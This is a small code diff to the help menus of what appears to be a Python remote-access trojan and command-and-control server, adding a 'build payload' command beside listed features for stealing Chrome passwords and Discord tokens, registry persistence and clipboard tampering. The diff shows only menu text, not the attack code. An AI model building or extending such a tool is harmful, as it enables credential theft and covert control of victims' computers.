@@ -194,8 +194,7 @@ def target_communication(target, ip):
             msgbox                             --> show msgbox ex:msgbox|yourtitle|yourtext
             chrome_recon                       --> recover Chrome Passwords
             disteal                            --> Get Discord tokens
-            priv                               --> Check User Priv
-          
+            priv                               --> Check User Priv 
             say                                --> make Target Computer talk ex: say something
             clip                               --> change data in clipoard
             persistence *RegName* *fileName*    --> Create Persistence In Registry'''))
@@ -261,6 +260,7 @@ while True:
     hacked          --> see connected targets
     exit            --> exit the C&C
     kill            --> kill session
+    build           --> build payload
     rmlist          --> remove disconnected target from list
     clear           --> clear the screen
             """)
